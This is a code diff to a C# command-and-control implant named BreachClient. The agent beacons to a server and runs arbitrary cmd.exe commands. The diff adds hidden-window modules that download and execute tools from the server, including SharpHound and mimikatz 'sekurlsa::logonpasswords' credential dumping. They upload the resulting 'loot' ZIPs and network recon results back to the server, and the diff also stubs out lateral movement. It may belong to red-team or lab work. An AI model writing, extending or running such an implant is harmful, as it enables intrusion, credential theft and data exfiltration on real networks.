@@ -1,6 +1,7 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
@@ -15,7 +16,7 @@ namespace BreachClient
     class Program
     {
         private static readonly HttpClient http = new HttpClient();
-        private static readonly string ServerId = "http://192.168.10.4:8080";
+        private static readonly string ServerId = "http://0.0.0.0:8080";
         private static readonly string AgentId = Guid.NewGuid().ToString();
         private static readonly int BeaconInterval = 5000; // ms
 
@@ -57,12 +58,17 @@ namespace BreachClient
                 taskIdEl.ValueKind != JsonValueKind.Null)
             {
                 int taskId = taskIdEl.GetInt32();
-                string taskType = doc.GetProperty("task_type").GetString()!;
+                string taskType   = doc.GetProperty("task_type").GetString()!;
                 string instruction = doc.GetProperty("instruction").GetString()!;
 
-                string output = taskType == "recon"
-                    ? RunRecon(instruction)
-                    : ExecuteCommand(instruction);
+                string output = taskType switch
+                {
+                    "recon"       => await RunRecon(instruction),
+                    "sharphound"  => await RunSharpHound(instruction),
+                    "secretsdump" => await RunDownloadAndExec(instruction),
+                    "dpapi"       => await RunDownloadAndExec(instruction),
+                    _             => ExecuteCommand(instruction)
+                };
 
                 await PostResult(taskId, output);
             }
@@ -76,12 +82,12 @@ namespace BreachClient
             {
                 var psi = new ProcessStartInfo
                 {
-                    FileName = "cmd.exe",
-                    Arguments = $"/c {instruction}",
+                    FileName               = "cmd.exe",
+                    Arguments              = $"/c {instruction}",
                     RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true
+                    RedirectStandardError  = true,
+                    UseShellExecute        = false,
+                    CreateNoWindow         = true
                 };
 
                 using var proc = Process.Start(psi)!;
@@ -97,20 +103,174 @@ namespace BreachClient
             }
         }
 
+        // ── Tool download / upload helpers ────────────────────────────────────
+
+        /// <summary>Download a tool from /files/<toolName> and save it to %TEMP%.</summary>
+        static async Task<string?> DownloadTool(string toolName)
+        {
+            try
+            {
+                var resp = await http.GetAsync($"{ServerId}/files/{toolName}");
+                if (!resp.IsSuccessStatusCode)
+                    return null;
+
+                string dest = Path.Combine(Path.GetTempPath(), toolName);
+                var bytes = await resp.Content.ReadAsByteArrayAsync();
+                await File.WriteAllBytesAsync(dest, bytes);
+                return dest;
+            }
+            catch
+            {
+                return null;
+            }
+        }
+
+        /// <summary>Upload a file from the agent back to the server's /upload endpoint.</summary>
+        static async Task UploadFile(string filePath)
+        {
+            try
+            {
+                using var form = new MultipartFormDataContent();
+                form.Add(new StringContent(AgentId), "agent_id");
+
+                var bytes = await File.ReadAllBytesAsync(filePath);
+                form.Add(new ByteArrayContent(bytes), "file", Path.GetFileName(filePath));
+
+                await http.PostAsync($"{ServerId}/upload", form);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Upload failed: {e.Message}");
+            }
+        }
+
+        // ── SharpHound module ─────────────────────────────────────────────────
+
+        /// <summary>
+        /// Download SharpHound.exe from the server, run it in a temp working directory,
+        /// upload any ZIP files it produces back to the server, then return stdout.
+        ///
+        /// Instruction: SharpHound CLI args (e.g. "-d ICCN.LOCAL --CollectionMethods All")
+        /// Leave empty to use SharpHound defaults.
+        /// </summary>
+        static async Task<string> RunSharpHound(string args)
+        {
+            string? toolPath = await DownloadTool("SharpHound.exe");
+            if (toolPath == null)
+                return "[error] Failed to download SharpHound.exe from server";
+
+            // Run in a dedicated temp directory so ZIP output is easy to find
+            string workDir = Path.Combine(Path.GetTempPath(), "sh_" + Guid.NewGuid().ToString("N")[..8]);
+            Directory.CreateDirectory(workDir);
+
+            string shPath = Path.Combine(workDir, "SharpHound.exe");
+            File.Copy(toolPath, shPath, overwrite: true);
+
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName               = shPath,
+                    Arguments              = string.IsNullOrWhiteSpace(args) ? "--zipfilename loot" : args,
+                    WorkingDirectory       = workDir,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError  = true,
+                    UseShellExecute        = false,
+                    CreateNoWindow         = true
+                };
+
+                using var proc = Process.Start(psi)!;
+                string stdout = proc.StandardOutput.ReadToEnd();
+                string stderr = proc.StandardError.ReadToEnd();
+                proc.WaitForExit();
+
+                // Upload every ZIP SharpHound produced
+                var zips = Directory.GetFiles(workDir, "*.zip");
+                foreach (var zip in zips)
+                    await UploadFile(zip);
+
+                string result = string.IsNullOrWhiteSpace(stderr)
+                    ? stdout
+                    : stdout + "\n[stderr] " + stderr;
+
+                return result.Trim() + $"\n[+] Uploaded {zips.Length} ZIP file(s) to server";
+            }
+            finally
+            {
+                try { Directory.Delete(workDir, recursive: true); } catch { }
+            }
+        }
+
+        // ── Generic tool execution (secretsdump, dpapi, …) ───────────────────
+
+        /// <summary>
+        /// Download a tool from /files/ and run it. The instruction format is:
+        ///   "toolname.exe [args...]"
+        /// The first token is the filename to download; the rest are passed as arguments.
+        ///
+        /// Examples:
+        ///   "mimikatz.exe sekurlsa::logonpasswords exit"
+        ///   "SharpDPAPI.exe triage"
+        /// </summary>
+        static async Task<string> RunDownloadAndExec(string instruction)
+        {
+            var parts    = instruction.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
+            string tool  = parts[0];
+            string tArgs = parts.Length > 1 ? parts[1] : "";
+
+            string? toolPath = await DownloadTool(tool);
+            if (toolPath == null)
+                return $"[error] Failed to download {tool} from server";
+
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName               = toolPath,
+                    Arguments              = tArgs,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError  = true,
+                    UseShellExecute        = false,
+                    CreateNoWindow         = true
+                };
+
+                using var proc = Process.Start(psi)!;
+                string stdout = proc.StandardOutput.ReadToEnd();
+                string stderr = proc.StandardError.ReadToEnd();
+                proc.WaitForExit();
+
+                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
+            }
+            catch (Exception e)
+            {
+                return $"[exec error] {e.Message}";
+            }
+        }
+
+        // ── Lateral movement (disabled — re-enable when BH integration is ready) ──
+        //
+        // static async Task<string> RunLateralMovement(string instruction)
+        // {
+        //     // Planned: parse BloodHound-derived action (e.g. ChangePassword, AddMember)
+        //     // and execute via native Windows commands or downloaded tooling.
+        //     // instruction format TBD once Graph Logic Engine is built.
+        //     return "[disabled] Lateral movement module not yet enabled";
+        // }
+
         // ── Recon engine ──────────────────────────────────────────────────────
 
         static readonly int[] CommonPorts = { 21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5985, 5986, 8080, 8443 };
-        static readonly int PingTimeout = 1000;   // ms
-        static readonly int PortTimeout = 500;    // ms
+        static readonly int PingTimeout   = 1000; // ms
+        static readonly int PortTimeout   = 500;  // ms
         static readonly int BannerTimeout = 1000; // ms
 
-        static string RunRecon(string target)
+        static async Task<string> RunRecon(string target)
         {
             var ips = ExpandTarget(target);
 
             // Parallel ping sweep
             var pingTasks = ips.Select(ip => PingHostAsync(ip)).ToArray();
-            Task.WaitAll(pingTasks);
+            await Task.WhenAll(pingTasks);
 
             var aliveHosts = ips
                 .Zip(pingTasks, (ip, t) => (ip, alive: t.Result))
@@ -130,14 +290,29 @@ namespace BreachClient
                 return new { ip, hostname, ports };
             }).ToList();
 
-            return JsonSerializer.Serialize(new { target, hosts });
+            string json = JsonSerializer.Serialize(new { target, hosts });
+
+            // Write to a temp file and upload to loot
+            string fileName = $"recon_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
+            string tempPath = Path.Combine(Path.GetTempPath(), fileName);
+            try
+            {
+                await File.WriteAllTextAsync(tempPath, json);
+                await UploadFile(tempPath);
+            }
+            finally
+            {
+                try { File.Delete(tempPath); } catch { }
+            }
+
+            return json;
         }
 
         static string ResolveHostname(string ip)
         {
             try
             {
-                var entry = System.Net.Dns.GetHostEntry(ip);
+                var entry = Dns.GetHostEntry(ip);
                 return entry.HostName;
             }
             catch { return ""; }
@@ -152,7 +327,7 @@ namespace BreachClient
                 if (!ar.AsyncWaitHandle.WaitOne(PortTimeout)) return null;
                 try { tcp.EndConnect(ar); } catch { return null; }
 
-                string banner = GrabBanner(tcp, ip, port);
+                string banner  = GrabBanner(tcp, ip, port);
                 string service = GetServiceName(port, banner);
                 return (port, service, banner);
             }
@@ -170,7 +345,6 @@ namespace BreachClient
                 var stream = tcp.GetStream();
                 stream.WriteTimeout = BannerTimeout;
 
-                // HTTP needs a request first
                 if (port == 80 || port == 8080)
                 {
                     var req = Encoding.ASCII.GetBytes($"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
@@ -179,7 +353,6 @@ namespace BreachClient
 
                 var buf = new byte[512];
                 int n = stream.Read(buf, 0, buf.Length);
-                // Strip non-printable chars and trim
                 return new string(Encoding.ASCII.GetString(buf, 0, n)
                     .Where(c => c >= 32 || c == '\n' || c == '\r')
                     .ToArray()).Trim();
@@ -198,7 +371,7 @@ namespace BreachClient
             if (banner.StartsWith("HTTP/") || banner.Contains("Server:"))
             {
                 var srv = banner.Split('\n').FirstOrDefault(l => l.StartsWith("Server:"));
-                return srv != null ? $"HTTP ({srv.Substring(7).Trim()})" : "HTTP";
+                return srv != null ? $"HTTP ({srv[7..].Trim()})" : "HTTP";
             }
             if (banner.StartsWith("230") || banner.StartsWith("331")) return "FTP";
             if (banner.StartsWith("+OK")) return "POP3";
@@ -219,7 +392,7 @@ namespace BreachClient
                 5986 => "WinRM-HTTPS",
                 8080 => "HTTP-Alt",
                 8443 => "HTTPS-Alt",
-                _    => $"unknown"
+                _    => "unknown"
             };
         }
 
@@ -229,19 +402,17 @@ namespace BreachClient
 
             if (target.Contains('/'))
             {
-                // CIDR notation
-                var parts = target.Split('/');
+                var parts  = target.Split('/');
                 int prefix = int.Parse(parts[1]);
                 var baseIp = IPAddress.Parse(parts[0]);
                 byte[] bytes = baseIp.GetAddressBytes();
 
-                // Only handle /8 to /24 to avoid huge ranges
                 if (prefix < 8 || prefix > 30)
                     return ips;
 
-                uint ipInt = (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
-                uint mask = prefix == 0 ? 0 : 0xFFFFFFFF << (32 - prefix);
-                uint network = ipInt & mask;
+                uint ipInt    = (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
+                uint mask      = prefix == 0 ? 0 : 0xFFFFFFFF << (32 - prefix);
+                uint network   = ipInt & mask;
                 uint broadcast = network | ~mask;
 
                 for (uint i = network + 1; i < broadcast; i++)
@@ -276,16 +447,15 @@ namespace BreachClient
             }
         }
 
-
         // ── Result posting ────────────────────────────────────────────────────
 
         static async Task PostResult(int taskId, string output)
         {
             var payload = JsonSerializer.Serialize(new
             {
-                task_id = taskId,
+                task_id  = taskId,
                 agent_id = AgentId,
-                output = output
+                output   = output
             });
 
             var response = await http.PostAsync(
